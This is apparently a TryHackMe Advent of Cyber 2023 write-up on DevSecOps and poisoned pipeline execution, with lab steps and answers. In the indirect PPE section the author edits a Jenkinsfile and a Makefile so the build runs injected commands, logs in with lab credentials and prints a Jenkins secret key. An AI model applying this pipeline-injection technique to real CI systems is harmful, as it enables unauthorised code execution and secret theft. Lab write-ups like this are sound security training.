# Advent of Cyber 2023 / Day 20 - 21
### DevSecOps
1. Integrates security concepts into the DevOps process, emphasizing collaboration between development, operations, and security teams.
2. Focuses on embedding security into every step of software development rather than adding it later. This reduces cyberattack risks and enhances software security confidence.
3. Common practices include utilizing tools and techniques such as automated security testing, code vulnerability analysis, and access control management.

---

### Shift Security Left 
1. Performing security checks early in development (Shift Left) reduces costs and time.
2. Discovering vulnerabilities in production may require system shutdown and complete rework, leading to high expenses.

---

### GitLab and SDLC Concepts
1. **GitLab**: A platform that enables collaboration and automation throughout the Software Development Lifecycle (SDLC).
2. **Software Development Life Cycle (SDLC)**: A process encompassing planning, designing, developing, testing, and delivering software.
3. **GitLab** is built on **Git**, a distributed version control system (VCS) for managing code.
4. **Key GitLab Components**:
    - **Version Control System (VCS)**: Manages and tracks code changes, facilitating collaboration and version history maintenance.
    - **CI/CD Pipelines**:
        - **CI (Continuous Integration)**:
            - Developers frequently push completed code to a central repository (e.g., GitLab).
            - The system automatically verifies and tests new code upon submission.
            - Reduces security risks by ensuring continuous checks and tests.
            - **DevSecOps Cycle**:
                - **Build**: Integrate and compile code into an application.
                - **Test**: Conduct unit and integration testing.
                - **Deploy**: Automatically push code to staging or production environments via the CI/CD pipeline.
        - **CD (Continuous Delivery)**:
            - **Automated Deployment**: Push code to various environments (e.g., sandbox, staging) automatically.
            - **Pre-Release Testing**: Ensures security and stability before deployment.
            - **Safe and Consistent Releases**: Facilitates secure and systematic code rollouts.
            - **DevSecOps Cycle**:
                - **Deploy**: Automate code deployment to staging or production.
                - **Release**: Make the software available for use.
                - **Operate**: Manage and maintain the production environment.
                - **Monitor**: Continuously track and audit security.
    - **Security Scanning**: GitLab provides security features such as **Static Application Security Testing (SAST)**, **Dynamic Application Security Testing (DAST)**, and **container scanning** to detect and mitigate security threats in code and infrastructure.

---

### Examples Related to Penetration Testing and CI/CD
1. **Static Application Security Testing (SAST)**
    - Example: Using GitHub Actions to scan code vulnerabilities (e.g., SQLi, XSS).
    - Implementation: Detects security issues early before merging code.
2. **Dynamic Application Security Testing (DAST)**
    - Example: Using OWASP ZAP in CI/CD pipelines to scan web applications.
    - Implementation: Identifies exploitable vulnerabilities (e.g., XSS, SSRF).
3. **Secret Detection**
    - Example: Scanning for API keys and credentials.
    - Implementation: Prevents sensitive data leaks via Git.
4. **Container Security**
    - Example: Scanning container images before deployment.
    - Implementation: Detects vulnerabilities in container dependencies.

---

### CI/CD Attack: Poisoned Pipeline Execution
1. **CI/CD Attack: (PPE)**
    - Targets specific components or stages of the SDLC.
    - Attackers gain access to version control systems (e.g., Git, GitLab) and compromise the CI/CD pipeline used for software builds and deployments.
2. **Impacts**
    - **Security Breaches**: Even if the main automation system is secured, attackers can exploit other weak points.
    - **Pipeline Disruption**: Previously secure pipelines can be compromised by inserting malicious code into the build process.

---

### Use GitLab
- Website: `http://10.10.31.78/`
- Username: DelfSecOps
- Password: TryHackMe!

1. Login to gitlab account.
![alt text](DevSecOps1.png)

2. Click `AoC DevSecOps / Advent-Calendar-BFC`.
![alt text](DevSecOps2.png)
![alt text](DevSecOps3.png)

3. The `gitlab-ci.yml` file automates the project workflow upon code updates in GitLab.
![alt text](DevSecOps4.png)

---

### Investigation
1. **Scenario**:
    - The Advent Calendar site has been stuck in testing for an unusually long time.
    - The team exhibits unusual behavior, and the site is malfunctioning.
2. **Mission**:
    - Assist Detective Frost in uncovering the root cause.
    - Start by examining merge requests.
3. **What is a Merge Request?**
    - A request to approve and merge new or modified code into the main branch.
    - Developers submit merge requests for review and approval before deployment.

4. Click `Merge requests` > `Merge tab` and look at `Update.gitlab-ci.yml`
![alt text](DevSecOps5.png)

5. Check the operating status of the system by viewing the job log.
- Click `CI/CD` > `Jobs`
![alt text](DevSecOps6.png)

6. Go visit website by looking port at `gitlab-ci.yml` file.
```yml
test:
  stage: test
  script:
    - docker run -d --name $CONTAINER_NAME -v $(pwd)/public/:/usr/local/apache2/htdocs/ -p 9081:80 httpd:latest
```
- Website: `http://10.10.31.78:9081/`
![alt text](DevSecOps7.png)

7. Click `CI/CD` > `Pipelines`.
![alt text](DevSecOps8.png)

8. Click `Passed` > `Test`
- The "testing" phase involves various actions. Lots of damage to the calendar!
![alt text](DevSecOps9.png)

9. Click `Repository` > `Commits`.
![alt text](DevSecOps10.png)

10. Find the commit that contains the source code that Delf Lead should add named `Adding test deploy pipeline for calendar`.
![alt text](DevSecOps11.png)

11. Click `Project Information` > `Activity`.
![alt text](DevSecOps12.png)

---

### Answer the Questions
1. **Developer responsible for the merge changes**: `@badsecops`
2. **Port of the defaced calendar site server**: `9081`
3. **Malicious server type**: `Apache`
4. **Message left by Frostlings on the defaced site**: `FROSTLINGS RULE`
5. **Commit ID of the original Advent Calendar site code**: `986b7407`

---

### Automation Platforms
1. **Jenkins and CI/CD Platforms**: Automate software build, testing, and deployment.
2. **Runners or Agents**: Execute builds on virtual machines (VMs).
3. **Build Environments**: Some CI/CD platforms auto-create environments for testing in different conditions.
4. **Platform Types**:
    - **Jenkins**: Self-hosted within an organization.
    - **Travis CI**: Cloud-based platform.

---

### Indirect Poisoned Pipeline Execution
1. **Configuration File Exploitation**: Attackers may lack direct source code modification rights but can alter build configuration files.
2. **Command Injection in Configuration Files**: Attackers insert malicious commands into these files.
3. **Compromised Build Environments**: If build environments (e.g., VMs) lack security, attackers can execute malicious commands.


- Website: `http://10.10.116.216:3000/`
1. Login account: `guest:password123`
![alt text](new_devsecops1.png)
![alt text](new_devsecops2.png)

- Another website: `http://10.10.116.216:8080/`
2. Login credentials: `admin:admin`
![alt text](new_devsecops3.png)
![alt text](new_devsecops4.png)

3. Look at `gift-wrapper-build` and you will see `Jenkinsfile`
![alt text](new_devsecops5.png)
- Jenkinsfile if the data warehouse is not protected An attacker can modify the pipeline file to execute commands on the build system.
- Attackers can control the build process by modifying `make || true` to `whoami`.
- Because the Jenkinsfile allows you to run shell commands as you can see on line 13.

```bash
$ git clone http://10.10.116.216:3000/McHoneyBell/gift-wrapper-pipeline.git

$ cd gift-wrapper-pipeline

$ cat Jenkinsfile
pipeline {
    agent any

    stages {
        stage('Prepare') {
            steps {
                git 'http://127.0.0.1:3000/McHoneyBell/gift-wrapper.git'
            }
        }

        stage('Build') {
            steps {
                sh 'whoami' # from line 13 I change 'make || true' to 'whoami' command
            }
        }
    }
}

$  git add .

$ git config --global user.name "guest"

$ git commit -m "I just add whoami command"
[main 7e1f552] I just add whoami command
1 file changed, 2 insertions(+), 2 deletions(-)
```

```bash
$ git clone http://10.10.116.216:3000/McHoneyBell/gift-wrapper.git

$ cd gift-wrapper

$ cat Makefile
build:
        whoami # change from './to_pip.sh' to whoami

$ git add .

$ git commit -m "I just add another whoami command"
[master 20b8bed] I just add another whoami command
1 file changed, 1 insertion(+), 1 deletion(-)

$ git push
Username for 'http://10.10.116.216:3000': 
Password for 'http://guest@10.10.116.216:3000':
# Username:Password = guest:password123
```

5. Go to: `http://10.10.116.216:8080/`
6. Click the gift-wrapper-build → gift-wrapper-pipeline → main
7. Click Build
8. Click Changes → console output
![alt text](new_devsecops6.png)

---

### Answer the Questions
1. **Linux kernel version on the Jenkins node**: `5.4.0-1029-aws`
2. **Value from /var/lib/jenkins/secret.key**: `90e748eafdd2af4746a5ef7941e63272f24f1e33a2882f614ebfa6742e772ba7`

---